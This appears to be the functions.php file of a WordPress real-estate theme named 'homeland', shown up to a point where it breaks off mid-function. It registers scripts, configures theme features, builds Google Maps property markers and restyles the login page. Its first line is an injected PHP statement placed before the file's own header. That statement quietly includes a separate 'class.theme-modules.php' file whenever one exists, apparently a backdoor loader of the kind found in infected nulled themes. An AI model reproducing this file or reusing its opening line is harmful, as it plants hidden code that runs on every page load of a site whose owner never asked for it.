<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
	/**
	 * homeland functions and definitions
	 *
	 * @link https://developer.wordpress.org/themes/basics/theme-functions/
	 *
	 * @package WordPress
	 * @subpackage homeland
	 * @since 1.0
	 */

	/**
	 * Included Files
	 */
	require get_parent_theme_file_path( '/inc/custom-widgets.php' );
	require get_parent_theme_file_path( '/inc/custom-css.php' );
	require get_parent_theme_file_path( '/inc/tgm/activation.php' );
	require get_parent_theme_file_path( '/inc/customizer/option-customizer.php' );


	/**
	 * Enqueue Stylesheets and Scripts
	 */
	if ( ! function_exists( 'homeland_script_styles_reg' ) ) :
		function homeland_script_styles_reg () {
			$homeland_map_api = get_option( 'homeland_map_api' );
			$homeland_top_element_display = get_option( 'homeland_top_element_display' );
			$homeland_hide_map_list = get_option( 'homeland_hide_map_list' );
			$homeland_bg_type = get_option( 'homeland_bg_type' );
			$homeland_theme_layout = get_option( 'homeland_theme_layout' );
			$homeland_parallax = get_option( 'homeland_parallax' );

			wp_enqueue_style( 'homeland-style', get_stylesheet_uri() );	
			wp_enqueue_style( 'homeland-style-minify', get_theme_file_uri( '/assets/css/style.min.css' ) );	
			wp_enqueue_style( 'font-awesome', get_theme_file_uri( '/assets/font-awesome/css/all.min.css' ), array(), '5.6.3', 'all' );
			
			// jquery scripts
			wp_enqueue_script( 'jquery-superfish', get_theme_file_uri( '/assets/js/superfish.min.js' ), array( 'jquery' ), '', true );
			wp_enqueue_script( 'jquery-retina', get_theme_file_uri( '/assets/js/retina.min.js' ), array( 'jquery' ), '', true );
			wp_enqueue_script( 'jquery-hover-modernizr', get_theme_file_uri( '/assets/js/modernizr.custom.js' ), array( 'jquery' ), '', true );
			wp_enqueue_script( 'jquery-validation', get_theme_file_uri( '/assets/js/jquery.validate.min.js' ), array( 'jquery' ), '', true );

			// flexslider
			wp_enqueue_style( 'jquery-flexslider', get_theme_file_uri( '/assets/js/flexslider/flexslider.css' ), array(), '', 'all' );
			wp_enqueue_script( 'jquery-flexslider', get_theme_file_uri( '/assets/js/flexslider/jquery.flexslider-min.js' ), array( 'jquery' ), '', true );

			// magnefic modal popup
			wp_enqueue_style( 'jquery-magnific', get_theme_file_uri( '/assets/js/magnific-popup/magnific-popup.css' ),	array(), '', 'all' );
			wp_enqueue_script( 'jquery-magnific', get_theme_file_uri( '/assets/js/magnific-popup/jquery.magnific-popup.min.js' ), array( 'jquery' ), '', true );

			// customize selectbox dropdown 
			wp_enqueue_style( 'jquery-select2', get_theme_file_uri( '/assets/js/select2/select2.css' ), array(), '', 'all' );
			wp_enqueue_script( 'jquery-select2', get_theme_file_uri( '/assets/js/select2/select2.min.js' ), array( 'jquery' ), '', true );

			// html5
			wp_enqueue_script( 'html5', get_theme_file_uri( '/assets/js/html5shiv.min.js' ), array(), '3.7.3' );
			wp_script_add_data( 'html5', 'conditional', 'lt IE 9' );
			
			// google maps
			wp_register_script( 'google-map-api', 'https://maps.googleapis.com/maps/api/js?key='. $homeland_map_api .'&callback' );
			wp_register_script( 'google-map-markerclusterer', get_theme_file_uri( '/assets/js/markerclusterer.min.js' ) );
			wp_register_script( 'google-map', get_theme_file_uri( '/assets/js/gmaps.min.js' ) );

			// homepage templates
			if( is_page_template( 'templates/template-homepage-gmap.php' ) || is_page_template( 'templates/template-homepage-gmap-large.php' ) ) : 
				wp_enqueue_script( 'google-map-api' );
				wp_enqueue_script( 'google-map-markerclusterer' );
				wp_enqueue_script( 'google-map' );
				add_action( 'wp_footer', 'homeland_google_map_homepage' ); 
			endif;

			// display google map in homepage
			if( 'google-map' === $homeland_top_element_display ) :
				if( is_page_template( 'templates/template-homepage.php' ) ) :
					wp_enqueue_script( 'google-map-api' );
					wp_enqueue_script( 'google-map-markerclusterer' );
					wp_enqueue_script( 'google-map' );
					add_action( 'wp_footer', 'homeland_google_map_homepage' ); 
				endif;
			endif;

			// property page and taxonomies
			if( is_tax( 'homeland_property_type') || is_tax( 'homeland_property_status' ) || is_tax( 'homeland_property_location' ) || is_tax( 'homeland_property_amenities' ) || is_page_template( 'templates/template-properties-1col.php' ) || is_page_template( 'templates/template-properties-2cols.php' ) || is_page_template( 'templates/template-properties-3cols.php' ) || is_page_template( 'templates/template-properties-4cols.php' ) || is_page_template( 'templates/template-properties-left-sidebar.php' ) || is_page_template( 'templates/template-properties.php' ) || is_page_template( 'templates/template-properties-featured.php' ) || is_page_template( 'templates/template-properties-grid-sidebar.php' ) || is_page_template( 'templates/template-properties-grid-left-sidebar.php' ) || is_post_type_archive( 'homeland_properties' ) || is_page_template( 'templates/template-properties-dual-sidebar.php' ) || is_page_template( 'templates/template-properties-sold.php' ) || is_page_template( 'templates/template-properties-fullwidth.php' ) || is_page_template( 'templates/template-open-house.php' ) ) : 
				if( empty( $homeland_hide_map_list ) ) :
					wp_enqueue_script( 'google-map-api' );
					wp_enqueue_script( 'google-map-markerclusterer' );
					wp_enqueue_script( 'google-map' );
					add_action( 'wp_footer', 'homeland_google_map_homepage' ); 
				endif;
			endif;

			// singular page for comments
			if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) :
				wp_enqueue_script( 'comment-reply' );
			endif;
			
			// background images
			if( 'Image' === $homeland_bg_type && ( 'Boxed' === $homeland_theme_layout || 'Boxed Left' === $homeland_theme_layout ) ) :
				wp_enqueue_script( 'jquery-backstretch', get_theme_file_uri( '/assets/js/jquery.backstretch.min.js' ), array( 'jquery' ), '', true );
			endif;

			// property single page
			if( is_singular( 'homeland_properties' ) ) : 
				wp_enqueue_script( 'google-map-api' );
				wp_enqueue_script( 'google-map' );
				add_action( 'wp_footer', 'homeland_google_map_property' );
			endif;
			
			// blog templates
			if( is_page_template( 'templates/template-blog.php' ) || is_page_template( 'templates/template-blog-3cols.php' ) || is_page_template( 'templates/template-blog-4cols.php' ) || is_page_template( 'templates/template-blog-fullwidth.php' ) || is_page_template( 'templates/template-blog-grid-left-sidebar.php' ) || is_page_template( 'templates/template-blog-grid.php' ) || is_page_template( 'templates/template-blog-left-sidebar.php' ) || is_page_template( 'templates/template-blog-timeline.php' ) || is_page_template( 'templates/template-blog-2cols.php' ) || is_page_template( 'templates/template-blog-list-alternate.php' ) || is_single() || is_archive() ) :
				wp_enqueue_script( 'jquery-tipsy', get_theme_file_uri( '/assets/js/tipsy/jquery.tipsy.min.js' ), array( 'jquery' ), '', true );
			endif;

			// contact us & property search template
			if( is_page_template( 'templates/template-contact.php' ) || is_page_template( 'templates/template-contact-alternate.php' ) || is_page_template( 'templates/template-contact-alternate2.php' ) || is_page_template( 'templates/template-property-search.php' ) ) :
				wp_enqueue_script( 'google-map-api' );
				wp_enqueue_script( 'google-map-markerclusterer' );
				wp_enqueue_script( 'google-map' );
			endif;

			// coming soon template
			if( is_page_template( 'templates/template-coming-soon.php' ) ) :
				wp_enqueue_script( 'jquery-countdown-plugin', get_theme_file_uri( '/assets/js/countdown/jquery.plugin.min.js' ), array( 'jquery' ), '', true );
				wp_enqueue_script( 'jquery-countdown', get_theme_file_uri( '/assets/js/countdown/jquery.countdown.min.js' ), array( 'jquery' ), '', true );
			endif;

			// rtl enable
			if ( is_rtl() ) :
				wp_enqueue_style( 'style-rtl', get_theme_file_uri( '/assets/css/rtl-main.css' ) );	
				wp_enqueue_style( 'style-rtl-responsive', get_theme_file_uri( '/assets/css/rtl-responsive.css' ) );	
			endif;

			if( !empty( $homeland_parallax ) ) :
				wp_enqueue_script( 'jquery-paroller', get_theme_file_uri( '/assets/js/jquery.paroller.min.js' ), array( 'jquery' ), '', true );
			endif;

			// jquery string localisation
			wp_localize_script( 'jquery-mobile-menu', 'menu_responsive_string', array(
				'menu_string' => esc_html__( 'Navigate Menu', 'homeland' ) )
			);	

			// custom jquery
			wp_enqueue_script( 'homeland-custom-js', get_theme_file_uri( '/assets/js/custom.min.js' ), array( 'jquery' ), '', true );
		}
	endif;
	add_action( 'wp_enqueue_scripts', 'homeland_script_styles_reg' );


	/**
	 * Theme Setup
	 */
	if ( ! function_exists( 'homeland_theme_setup' ) ) :
		function homeland_theme_setup() {
			// localisation
			load_theme_textdomain( 'homeland' );

			// register menus
			register_nav_menus( array(
				'primary-menu' => esc_html__( 'Primary Menu', 'homeland' ),
				'footer-menu' => esc_html__( 'Footer Menu', 'homeland' )
			) );

			// theme support and filter
			add_filter( 'widget_text', 'do_shortcode' );
			add_theme_support( 'title-tag' );
			add_theme_support( 'automatic-feed-links' );
			add_theme_support( 'html5', array( 
				'comment-form', 
				'comment-list', 
				'gallery', 
				'caption' 
			) );
			add_theme_support( 'post-formats', array( 'image', 'video', 'gallery', 'audio' ) );
			add_theme_support( 'customize-selective-refresh-widgets' );
			add_theme_support( 'post-thumbnails', array( 
				'post',  
				'homeland_properties', 
				'homeland_testimonial', 
				'homeland_partners', 
				'homeland_portfolio', 
				'homeland_services' 
			) );

			// image sizes
			set_post_thumbnail_size( 370, 370, true ); 
			add_image_size( 'homeland_thumbs', 400, 400, true );
			add_image_size( 'homeland_large_thumb', 600, 400, true );
			add_image_size( 'homeland_large_image', 800, 800, true );
			add_image_size( 'homeland_bigger_image', 1200, 9999 );
			add_image_size( 'homeland_slider', 1920, 664, true );

			// set the default content width
			$GLOBALS['content_width'] = 1100;
		}
	endif;
	add_action( 'after_setup_theme', 'homeland_theme_setup' );


	/**
	 * Add Pingback in Header
	 */
	if ( ! function_exists( 'homeland_pingback_header' ) ) :	
		function homeland_pingback_header() {
			if ( is_singular() && pings_open() ) :
				printf( '<link rel="pingback" href="%s">' . "\n", get_bloginfo( 'pingback_url' ) );
			endif;
		}
	endif;
	add_action( 'wp_head', 'homeland_pingback_header' );


	/**
	 * Admin Custom Stylesheets
	 */
	if ( ! function_exists( 'homeland_custom_admin_style' ) ) :	
		function homeland_custom_admin_style() {
			if( is_admin() ) :
				wp_enqueue_style( 'font-awesome', get_theme_file_uri( '/assets/font-awesome/css/all.min.css' ), array(), '5.6.3', 'all' );
				wp_enqueue_style( 'style-admin', get_theme_file_uri( '/assets/css/admin.min.css' ), array(), '', 'all' );
				wp_enqueue_script( 'jquery-admin', get_theme_file_uri( '/assets/js/admin.min.js' ), array( 'jquery' ), '', true );
				wp_enqueue_media();
			endif;

			if( is_rtl() ) :
				wp_enqueue_style( 'style-rtl', get_theme_file_uri( '/assets/css/rtl-main.css' ) );
			endif;
		}
	endif;
	add_action( 'admin_enqueue_scripts', 'homeland_custom_admin_style' );


	/**
	 * Homepage Google Map
	 */
	if ( ! function_exists( 'homeland_google_map_homepage' ) ) :
		function homeland_google_map_homepage() {
			global $post, $wp_query;

			$homeland_home_map_zoom = get_option( 'homeland_home_map_zoom' );
			$homeland_home_map_lat = get_option( 'homeland_home_map_lat' );
			$homeland_home_map_lng = get_option( 'homeland_home_map_lng' );
			$homeland_map_styles = get_option( 'homeland_map_styles' );
			$homeland_map_pointer_clusterer_icon = get_option( 'homeland_map_pointer_clusterer_icon' );
			$homeland_map_pointer_icon = get_option( 'homeland_map_pointer_icon' );

			$homeland_term = $wp_query->queried_object; 
			$homeland_home_map_zoom_value = !empty( $homeland_home_map_zoom ) ? $homeland_home_map_zoom : '8'; 
			$homeland_map_styles_value = !empty( $homeland_map_styles ) ? $homeland_map_styles : '0'; 
			$homeland_lat_default_value = '37.0625';
			$homeland_lng_default_value = '-95.677068';

			if( !empty( $post->homeland_property_lat ) && !empty( $post->homeland_property_lng )) : 
				$homeland_lat_main_value = esc_html( $post->homeland_property_lat ); 
				$homeland_lng_main_value = esc_html( $post->homeland_property_lng ); 
			else : 
				$homeland_lat_main_value = esc_html( $homeland_lat_default_value ); 
				$homeland_lng_main_value = esc_html( $homeland_lng_default_value ); 
			endif;

			if( !empty( $homeland_home_map_lat ) && !empty( $homeland_home_map_lng ) ) :
				$homeland_home_map_lat_value = esc_html( $homeland_home_map_lat ); 
				$homeland_home_map_lng_value = esc_html( $homeland_home_map_lng ); 
			else :
				$homeland_home_map_lat_value = esc_html( $homeland_lat_default_value ); 
				$homeland_home_map_lng_value = esc_html( $homeland_lng_default_value ); 
			endif;

			if( is_tax( 'homeland_property_location' ) || is_tax( 'homeland_property_type' ) || is_tax( 'homeland_property_status' ) || is_tax( 'homeland_property_amenities' ) ) :
				$homeland_lat_gmap_value = esc_html( $homeland_lat_main_value );
				$homeland_lng_gmap_value = esc_html( $homeland_lng_main_value );
			else :
				$homeland_lat_gmap_value = esc_html( $homeland_home_map_lat_value );
				$homeland_lng_gmap_value = esc_html( $homeland_home_map_lng_value );
			endif;

			$homeland_gmap_pointer_icon = ( !empty( $homeland_map_pointer_clusterer_icon ) ) ? esc_url( $homeland_map_pointer_clusterer_icon ) : get_theme_file_uri( '/assets/img/clusterer.png' );

			if( is_tax( 'homeland_property_type' ) ) 
				$homeland_gmap_tax_value = 'homeland_property_type';
			if( is_tax( 'homeland_property_status' ) ) 
				$homeland_gmap_tax_value = 'homeland_property_status'; 
			if( is_tax( 'homeland_property_location' ) ) 
				$homeland_gmap_tax_value = 'homeland_property_location'; 
			if( is_tax( 'homeland_property_amenities' ) ) 
				$homeland_gmap_tax_value = 'homeland_property_amenities';
			if( is_page_template( 'templates/template-properties-featured.php' ) ) 
				$homeland_gmap_meta_value = 'homeland_featured';
			if( is_page_template( 'templates/template-open-house.php' ) ) 
				$homeland_gmap_meta_value = 'homeland_property_open_house';
			if( is_page_template( 'templates/template-properties-sold.php' ) ) 
				$homeland_gmap_meta_value = 'homeland_property_sold';
			?>
			<script type="text/javascript">
				(function($) {
			  	"use strict";

			  	var map;
			   	$(document).ready(function(){
		    		map = new GMaps({
				      div: '#map-homepage',
				      scrollwheel: false,
				      lat: <?php echo esc_html( $homeland_lat_gmap_value ); ?>,
							lng: <?php echo esc_html( $homeland_lng_gmap_value ); ?>,
							zoom: <?php echo esc_html( $homeland_home_map_zoom_value ); ?>,
							styles: <?php echo wp_kses_post( $homeland_map_styles_value ); ?>,
							markerClusterer: function(map) {
						   	return new MarkerClusterer(map, [], {
					      	gridSize: 60, maxZoom: 14,
						      styles: [{
										width: 50, height: 50,
										url: "<?php echo esc_url( $homeland_gmap_pointer_icon ); ?>"
									}] 
						   	});
							}
			    	});
			    	map.setCenter(<?php echo esc_html( $homeland_lat_gmap_value ); ?>, <?php echo esc_html( $homeland_lng_gmap_value ); ?>);
      			var image = "<?php echo esc_url( $homeland_map_pointer_icon ); ?>";

      			<?php 
      				if( is_tax( 'homeland_property_location' ) || is_tax( 'homeland_property_type' ) || is_tax( 'homeland_property_status' ) || is_tax( 'homeland_property_amenities' ) ) :
      					$args = array( 
	      					'post_type' => 'homeland_properties', 
	      					'taxonomy' => $homeland_gmap_tax_value, 
	      					'term' => $homeland_term->slug,
	      					'meta_query' => array( 'relation' => 'OR',
							      array( 'key' => 'homeland_price', 'compare' => 'EXISTS' ),
							      array( 'key' => 'homeland_price', 'compare' => 'NOT EXISTS' )
							    )
	      				);
	      			elseif( is_page_template( 'templates/template-properties-featured.php' ) || is_page_template( 'templates/template-properties-sold.php' ) || is_page_template( 'templates/template-open-house.php' ) ) :
	      				$args = array( 
		      				'post_type' => 'homeland_properties', 
									'posts_per_page' => -1, 
									'meta_query' => array( array( 
										'key' => $homeland_gmap_meta_value, 
										'value' => 'on', 
										'compare' => '==' 
									) ) 
	      				);
	      			else : 
	      				$args = array( 
									'post_type' => 'homeland_properties', 
									'posts_per_page' => -1 
								);
	      			endif;

	      			$args_map = apply_filters( 'homeland_properties_parameters', $args );
							$wp_query = new WP_Query( $args_map );	

							while ( $wp_query->have_posts() ) : $wp_query->the_post(); 	
								if( !empty( $post->homeland_property_lat ) && !empty( $post->homeland_property_lng ) ) : 
									$homeland_lat_value = esc_html( $post->homeland_property_lat );
									$homeland_lng_value = esc_html( $post->homeland_property_lng );
								else :
									$homeland_lat_value = esc_html( $homeland_lat_default_value );
									$homeland_lng_value = esc_html( $homeland_lng_default_value );
								endif;
								?>
									map.addMarker({
										lat: <?php echo esc_html( $homeland_lat_value ); ?>, 
										lng: <?php echo esc_html( $homeland_lng_value ); ?>, 
								    title: '<?php the_title(); ?>',
								    <?php if( !empty( $homeland_map_pointer_icon ) ) : ?>
								    	icon: image, 
								    <?php endif; ?>
							      infoWindow: {
								   		content: '<?php get_template_part( 'template-parts/component/gmap-content' ); ?>'
								    }
								  });
								<?php
					    endwhile; 
				    	wp_reset_query(); 
				    ?>			        
				  });
				})(jQuery);					
			</script><?php
		}
	endif;


	/**
	 * Search Results Google Map
	 */
	if ( ! function_exists( 'homeland_google_map_search' ) ) :
		function homeland_google_map_search() {
			global $post, $args_wp;
			
			$homeland_home_map_zoom = get_option( 'homeland_home_map_zoom' );
			$homeland_home_map_lat = get_option( 'homeland_home_map_lat' );
			$homeland_home_map_lng = get_option( 'homeland_home_map_lng' );
			$homeland_map_styles = get_option( 'homeland_map_styles' );
			$homeland_map_pointer_clusterer_icon = get_option( 'homeland_map_pointer_clusterer_icon' );
			$homeland_map_pointer_icon = get_option( 'homeland_map_pointer_icon' );

			$homeland_home_map_zoom_value = !empty( $homeland_home_map_zoom ) ? $homeland_home_map_zoom : '8';
			$homeland_map_styles_value = !empty( $homeland_map_styles ) ? $homeland_map_styles : '0'; 
			$homeland_lat_default_value = '37.0625';
			$homeland_lng_default_value = '-95.677068';

			if( !empty( $homeland_home_map_lat ) && !empty( $homeland_home_map_lng ) ) :
				$homeland_home_map_lat_value = esc_html( $homeland_home_map_lat ); 
				$homeland_home_map_lng_value = esc_html( $homeland_home_map_lng ); 
			else :
				$homeland_home_map_lat_value = esc_html( $homeland_lat_default_value ); 
				$homeland_home_map_lng_value = esc_html( $homeland_lng_default_value ); 
			endif;

			$homeland_gmap_pointer_icon = ( !empty( $homeland_map_pointer_clusterer_icon ) ) ? esc_url( $homeland_map_pointer_clusterer_icon ) : get_theme_file_uri( '/assets/img/clusterer.png' );
			?>
			<script type="text/javascript">
				(function($) {
			  	"use strict";

			  	var map;
			   	$(document).ready(function(){
				   	map = new GMaps({
				      div: '#map-property-search',
				      scrollwheel: false,
				      lat: <?php echo esc_html( $homeland_home_map_lat_value ); ?>,
							lng: <?php echo esc_html( $homeland_home_map_lng_value ); ?>,
							zoom: <?php echo esc_html( $homeland_home_map_zoom_value ); ?>,
							styles : <?php echo wp_kses_post( $homeland_map_styles_value ); ?>,
							markerClusterer: function(map) {
						   	return new MarkerClusterer(map, [], {
					      	gridSize: 60, maxZoom: 14,
						      styles: [{
										width: 50, height: 50,
										url: "<?php echo esc_url( $homeland_gmap_pointer_icon ); ?>"
									}] 
					    	});
						 	}
				    });		      	
				   	var image = "<?php echo esc_url( $homeland_map_pointer_icon ); ?>";
				   	<?php
							$args_map = apply_filters( 'homeland_advance_search_parameters', $args_wp );
							$wp_query_map = new WP_Query( $args_map );

							while ( $wp_query_map->have_posts() ) : $wp_query_map->the_post(); 	
								if( !empty( $post->homeland_property_lat ) && !empty( $post->homeland_property_lng ) ) : 
									$homeland_lat_value = esc_html( $post->homeland_property_lat );
									$homeland_lng_value = esc_html( $post->homeland_property_lng );
								else :
									$homeland_lat_value = esc_html( $homeland_lat_default_value );
									$homeland_lng_value = esc_html( $homeland_lng_default_value );
								endif;
								?>
									map.addMarker({
										lat: <?php echo esc_html( $homeland_lat_value ); ?>, 
										lng: <?php echo esc_html( $homeland_lng_value ); ?>,
							      title: '<?php the_title(); ?>',
							      <?php if( !empty( $homeland_map_pointer_icon ) ) : ?>
							      	icon: image, 
							      <?php endif; ?>
							      infoWindow: {
											content: '<?php get_template_part( 'template-parts/component/gmap-content' ); ?>'
								    }
								  });
								<?php
					    endwhile; 
					    wp_reset_query(); 
					  ?>			        
				  });
				})(jQuery);					
			</script><?php
		}
	endif;


	/**
	 * Property Google Map
	 */
	if ( ! function_exists( 'homeland_google_map_property' ) ) :
		function homeland_google_map_property() {
			global $post;

			$homeland_hide_map = get_option( 'homeland_hide_map' );
			$homeland_map_styles = get_option( 'homeland_map_styles' );
			$homeland_map_pointer_icon = get_option( 'homeland_map_pointer_icon' );
			$homeland_show_street_view = get_option( 'homeland_show_street_view' );

			$homeland_property_map_zoom_value = !empty( $post->homeland_property_map_zoom ) ? $post->homeland_property_map_zoom : '8';
			$homeland_map_styles_value = !empty( $homeland_map_styles ) ? $homeland_map_styles : '0'; 
			$homeland_lat_default_value = '37.0625';
			$homeland_lng_default_value = '-95.677068';

			if( !empty( $post->homeland_property_lat ) && !empty( $post->homeland_property_lng ) ) : 
				$homeland_lat_value = esc_html( $post->homeland_property_lat ); 
				$homeland_lng_value = esc_html( $post->homeland_property_lng ); 
			else : 
				$homeland_lat_value = esc_html( $homeland_lat_default_value );
				$homeland_lng_value = esc_html( $homeland_lng_default_value );
			endif;

			if( empty( $post->homeland_property_hide_map ) || empty( $homeland_hide_map ) ) : ?>
				<script type="text/javascript">
					(function($) {
				  	"use strict";

				  	var map;
				   	$(document).ready(function(){
					   	map = new GMaps({
			        	div: '#map-property',
			        	scrollwheel: false,
								lat: <?php echo esc_html( $homeland_lat_value ); ?>, 
								lng: <?php echo esc_html( $homeland_lng_value ); ?>,
								zoom: <?php echo esc_html( $homeland_property_map_zoom_value ); ?>,
								styles : <?php echo wp_kses_post( $homeland_map_styles_value ); ?>,
				      });
				    	var image = "<?php echo esc_url( $homeland_map_pointer_icon ); ?>";
					      	
			      	map.addMarker({
					      <?php if( !empty( $homeland_map_pointer_icon ) ) : ?>
					      	icon: image, 
					      <?php endif; ?>
								lat: <?php echo esc_html( $homeland_lat_value ); ?>, 
								lng: <?php echo esc_html( $homeland_lng_value ); ?>,   
								infoWindow: { 
									content: '<?php echo wp_kses_post( $post->homeland_address ); ?>' 
								}
			      	});

			      	<?php if( !empty( $homeland_show_street_view ) ) : ?>	
			      		var panorama;
				      	panorama = GMaps.createPanorama({
							  	el: '#map-property-street',
							  	scrollwheel: false,
							  	lat: <?php echo esc_html( $homeland_lat_value ); ?>, 
							  	lng: <?php echo esc_html( $homeland_lng_value ); ?>,  
								});
							<?php endif; ?>

							google.maps.event.trigger(map.markers[0], 'click');
				   	});
					})(jQuery);					
				</script><?php
			endif;
		}
	endif;


	/**
	 * Contact Us Google Map
	 */
	if ( ! function_exists( 'homeland_google_map' ) ) :
		function homeland_google_map() {
			$homeland_map_zoom = get_option( 'homeland_map_zoom' );
			$homeland_map_styles = get_option( 'homeland_map_styles' );
			$homeland_map_pointer_icon = get_option( 'homeland_map_pointer_icon' );
			$homeland_map_lat = get_option( 'homeland_map_lat' );
			$homeland_map_lng = get_option( 'homeland_map_lng' );
			$homeland_contact_address = get_option( 'homeland_contact_address' );

			$homeland_map_zoom_value = !empty( $homeland_map_zoom ) ? $homeland_map_zoom : '8';
			$homeland_map_styles_value = !empty( $homeland_map_styles ) ? $homeland_map_styles : '0';
			$homeland_home_map_icon_value = !empty( $homeland_map_pointer_icon ) ? $homeland_map_pointer_icon : '';
			$homeland_lat_default_value = '37.0625';
			$homeland_lng_default_value = '-95.677068';

			if( !empty( $homeland_map_lat ) && !empty( $homeland_map_lng ) ) : 
				$homeland_lat_value = esc_html( $homeland_map_lat ); 
				$homeland_lng_value = esc_html( $homeland_map_lng ); 
			else : 
				$homeland_lat_value = esc_html( $homeland_lat_default_value );
				$homeland_lng_value = esc_html( $homeland_lng_default_value );
			endif;

			wp_enqueue_script( 'homeland-custom-js', get_theme_file_uri( '/assets/js/custom.min.js' ), array( 'jquery' ), '' );

			$homeland_custom_js = "(function($) {
				'use strict'; 
				var map;
		  	
		   	$(document).ready(function(){
		    	map = new GMaps({
		        div: '#map',
		        scrollwheel: false,
			      lat: " . esc_html( $homeland_lat_value ) . ",
						lng: " . esc_html( $homeland_lng_value ) . ",
						zoom: " . esc_html( $homeland_map_zoom_value ) . ",
						styles : " . wp_kses_post( $homeland_map_styles_value ) . ",
		      });
		    	var image = '" . esc_url( $homeland_home_map_icon_value ) . "';	
	      	map.addMarker({
	        	lat: " . esc_html( $homeland_lat_value ) . ",
						lng: " . esc_html( $homeland_lng_value ) . ",
	        	title: '',
	        	icon: image,
	        	infoWindow: { content: '" . wp_kses_post( $homeland_contact_address ) . "' }
	      	});
					google.maps.event.trigger(map.markers[0], 'click');
		   	});
			})(jQuery);";
			
			if( is_page_template( 'templates/template-contact.php' ) || is_page_template( 'templates/template-contact-alternate.php' ) || is_page_template( 'templates/template-contact-alternate2.php' ) ) :
				wp_add_inline_script( 'homeland-custom-js', $homeland_custom_js );
			endif;
		}
	endif;
	add_action( 'wp_enqueue_scripts', 'homeland_google_map' );


	/**
	 * Change Default login logo and link
	 */
	function homeland_login_image() {
		$homeland_logo = get_option( 'homeland_logo' );

		wp_enqueue_style( 'homeland-custom-style', get_theme_file_uri( '/assets/css/admin.min.css' ) );

		$homeland_custom_css = "
			#login h1 a, 
			body.login h1 a {
				background-image: url('". esc_url( $homeland_logo ) ."');
				height: 126px;
				width: 100%;
				background-size: auto;
				background-repeat: no-repeat;
			}
		";
		if( !empty( $homeland_logo ) ) : 
			wp_add_inline_style( 'homeland-custom-style', $homeland_custom_css );
		endif;
	}
	add_action( 'login_enqueue_scripts', 'homeland_login_image' );

	function homeland_custom_login_url() { 
		return home_url(); 
	}
	add_filter( 'login_headerurl', 'homeland_custom_login_url' ); 

	function homeland_custom_login_url_title() {
    return esc_attr( get_bloginfo( 'description' ) );
	}
	add_filter( 'login_headertitle', 'homeland_custom_login_url_title' ); 


	/**
	 * Main Menu and Footer fallback
	 */
	if ( ! function_exists( 'homeland_menu_fallback' ) ) :
		function homeland_menu_fallback() {
			?>
				<div id="dropdown" class="theme-menu clearfix">
					<ul id="main-menu" class="sf-menu">
						<?php wp_list_pages( 'title_li=&sort_column=menu_order' ); ?>
					</ul>
				</div>
			<?php
		}
	endif;

	if ( ! function_exists( 'homeland_footer_menu_fallback' ) ) :
		function homeland_footer_menu_fallback() {
			?>
				<div class="footer-menu">
					<ul id="menu-footer-menu" class="clearfix">
						<?php wp_list_pages( 'title_li=&sort_column=menu_order' ); ?>
					</ul>
				</div>
			<?php
		}
	endif;


	/**
	 * Page Subtitle
	 */
	if ( ! function_exists( 'homeland_get_page_title_subtitle_desc' ) ) :
		function homeland_get_page_title_subtitle_desc() {
			global $homeland_theme_pages;

			foreach( $homeland_theme_pages as $homeland_page ) :
				$homeland_page_title = get_post_meta( $homeland_page->ID, 'homeland_ptitle', true );
				$homeland_page_subtitle = get_post_meta( $homeland_page->ID, 'homeland_subtitle', true );
				$homeland_post_title = $homeland_page->post_title;

				$homeland_ptitle = !empty( $homeland_page_title ) ? $homeland_page_title : $homeland_post_title;
			endforeach; 

			echo '<h2 class="ptitle">'. wp_kses_post ( $homeland_ptitle ) .'</h2>';
			if( !empty( $homeland_page_subtitle ) ) : 
				echo '<h4 class="subtitle"><label>'. wp_kses_post ( $homeland_page_subtitle ) .'</label></h4>';
			endif;
		}
	endif;


	/**
	 * Get Property Type
	 */
	if ( ! function_exists( 'homeland_get_property_category' ) ) :
		function homeland_get_property_category() {
			global $homeland_properties_page_url, $homeland_properties_page_2cols_url, $homeland_properties_page_3cols_url, $homeland_properties_page_4cols_url; 

				if( is_page_template( 'templates/template-properties.php' ) || is_page_template( 'templates/template-properties-2cols.php' ) || is_page_template( 'templates/template-properties-3cols.php' ) || is_page_template( 'templates/template-properties-4cols.php' ) ) : 		
					$homeland_current_class = "current-cat"; 
				endif;
			?>
			<div class="cat-toogles">
				<ul class="cat-list clearfix">
					<li class="<?php echo esc_attr( $homeland_current_class ); ?>">
						<a href="<?php echo esc_url( $homeland_properties_page_url ); ?>">
							<?php esc_html_e( 'All', 'homeland' ); ?>
						</a>
					</li>
					<?php
						$args = array( 
							'taxonomy' => 'homeland_property_type', 
							'style' => 'list', 
							'title_li' => '', 
							'hierarchical' => false, 
							'order' => 'ASC', 
							'orderby' => 'title' 
						);
						wp_list_categories ( $args );
					?>	
				</ul>
			</div><?php
		}
	endif;	


	/**
	 * Get Page Template Link
	 */
	if ( ! function_exists( 'homeland_template_page_link' ) ) :
		function homeland_template_page_link() {
			global $homeland_blog_page_url, $homeland_contact_page_url, 
			$homeland_properties_page_url, $homeland_properties_page_2cols_url, 
			$homeland_properties_page_3cols_url, $homeland_properties_page_4cols_url, 
			$homeland_about_page_url, $homeland_agent_page_url, 
			$homeland_services_page_url, $homeland_advance_search_page_url, 
			$homeland_portfolio_page_url, $homeland_login_page_url, $homeland_print_page_url;

			$homeland_properties_pages = get_pages( array( 'meta_key' => '_wp_page_template', 'meta_value' => 'templates/template-properties.php' ) );
			foreach( $homeland_properties_pages as $page ) :
				$homeland_properties_page_url = esc_url( get_permalink( $page->ID ) );
			endforeach;

			$homeland_properties_pages_4cols = get_pages( array( 'meta_key' => '_wp_page_template', 'meta_value' => 'templates/template-properties-4cols.php' ) );
			foreach( $homeland_properties_pages_4cols as $page ) :
				$homeland_properties_page_4cols_url = esc_url( get_permalink( $page->ID ) );
			endforeach;

			$homeland_properties_pages_3cols = get_pages( array( 'meta_key' => '_wp_page_template', 'meta_value' => 'templates/template-properties-3cols.php' ) );
			foreach( $homeland_properties_pages_3cols as $page ) :
				$homeland_properties_page_3cols_url = esc_url( get_permalink( $page->ID ) );
			endforeach;

			$homeland_properties_pages_2cols = get_pages( array( 'meta_key' => '_wp_page_template', 'meta_value' => 'templates/template-properties-2cols.php' ) );
			foreach( $homeland_properties_pages_2cols as $page ) :
				$homeland_properties_page_2cols_url = esc_url( get_permalink( $page->ID ) );
			endforeach;

			$homeland_blog_pages = get_pages( array( 'meta_key' => '_wp_page_template', 'meta_value' => 'templates/template-blog.php' ) );
			foreach( $homeland_blog_pages as $page ) :
				$homeland_blog_page_url = esc_url( get_permalink( $page->ID ) );
			endforeach;

